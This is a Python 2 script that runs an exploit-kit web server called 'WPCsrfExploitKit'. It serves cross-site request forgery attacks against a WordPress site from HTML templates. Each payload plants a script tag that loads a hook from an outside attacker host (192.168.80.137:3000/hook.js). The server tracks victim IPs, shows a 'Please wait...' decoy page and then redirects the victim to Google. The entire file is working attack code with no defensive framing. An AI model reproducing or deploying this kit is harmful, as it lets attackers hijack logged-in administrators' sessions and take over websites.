from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from urlparse import urlparse, parse_qs
import base64
import os
import random
import string
import urllib
import cgi

targets = {'Ua90fhioasdfjioas' : 'http://192.168.1.116/wordpress'}
requestsByIp = {}
cachedExploits = {}
thisUrl = "http://localhost:8081"
callbackUrl = "http://192.168.80.137:3000/hook.js"


class WPCsrfExploitKit(BaseHTTPRequestHandler):

    def do_GET(self):

        if "favicon.ico" in self.path:
            self.send_response(404, 'Not found')
            self.end_headers()
            return

        ip = self.client_address[0]
        if ip in requestsByIp and requestsByIp[ip] > 2:
            return
        
        if ip in requestsByIp:
            requestsByIp[ip] += 1
        else:
            requestsByIp[ip] = 1

        self.send_response(200, 'OK')
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        path = self.path[1:]

        if ip in cachedExploits:
            if path in cachedExploits[ip]:
                self.handle_exploit(ip, path)
        elif path in targets:
           self.generate_exploit(targets[path], ip)


    def generate_callback(self, targetBlog):
        return cgi.escape("<script src='%s'></script>" % (callbackUrl))


    def generate_exploit(self, targetBlog, ip):
        cachedExploits[ip] = {}
        self.wfile.write("<html><head><title>Please wait...</title></head><body><b>Please wait...</b>")
        for f in os.listdir("./exploits"):
            if f.endswith(".html"):
                randomUrl = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(15))
                content = open("./exploits/" +  f).read().split('\n')
                detectionLine = content[0] % (targetBlog, "window.location = '/" + randomUrl + "';")
                exploit = '\n'.join(content[1:]) % (targetBlog, self.generate_callback(targetBlog))
                cachedExploits[ip][randomUrl] = exploit
                self.wfile.write(detectionLine)
        self.wfile.write("<script>setInterval(\"window.location='http://www.google.com'\", 5000);</script></body></html>")


    def handle_exploit(self, ip, path):
        self.wfile.write(cachedExploits[ip][path])
        del cachedExploits[ip]


    @staticmethod
    def serve_forever(port):
        HTTPServer(('', port), WPCsrfExploitKit).serve_forever()


WPCsrfExploitKit.serve_forever(8081)